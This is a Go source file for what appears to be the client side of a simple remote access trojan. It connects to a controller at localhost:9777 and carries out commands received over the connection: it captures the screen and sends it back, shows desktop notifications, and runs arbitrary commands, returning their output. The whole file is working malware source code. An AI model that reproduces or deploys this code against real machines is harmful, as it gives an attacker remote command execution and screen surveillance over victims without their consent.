package main

import (
	"bytes"
	"encoding/gob"
	"image/jpeg"
	"net"
	"os/exec"

	"github.com/golang/snappy"
	"github.com/joetifa2003/rat-go/pkg/models"
	"github.com/kbinani/screenshot"
	"github.com/martinlindhe/notify"
)

func main() {
	conn, err := net.Dial("tcp", "localhost:9777")
	if err != nil {
		panic(err)
	}
	defer conn.Close()
	enc := gob.NewEncoder(snappy.NewWriter(conn))
	dec := gob.NewDecoder(snappy.NewReader(conn))

	for {
		var commandStruct models.Message
		err := dec.Decode(&commandStruct)
		if err != nil {
			panic(err)
		}

		switch commandStruct.Type {
		case models.MessagePing:
			err := enc.Encode(models.Message{Type: models.MessagePing, PingResponse: "pong"})
			if err != nil {
				panic(err)
			}
		case models.MessageScreenShot:
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err != nil {
				panic(err)
			}
			var buffer bytes.Buffer
			jpeg.Encode(&buffer, img, &jpeg.Options{
				Quality: 70,
			})
			err = enc.Encode(models.Message{Type: models.MessageScreenShot, ScreenShotResponse: buffer.Bytes()})
			if err != nil {
				panic(err)
			}
		case models.MessageMsg:
			notify.Notify("rat", "message", commandStruct.MsgRequest, "")
		case models.MessageExec:
			cmd, err := exec.Command(commandStruct.ExecRequest).Output()
			if err != nil {
				panic(err)
			}

			err = enc.Encode(models.Message{Type: models.MessageExec, ExecResponse: string(cmd)})
			if err != nil {
				panic(err)
			}
		}
	}
}
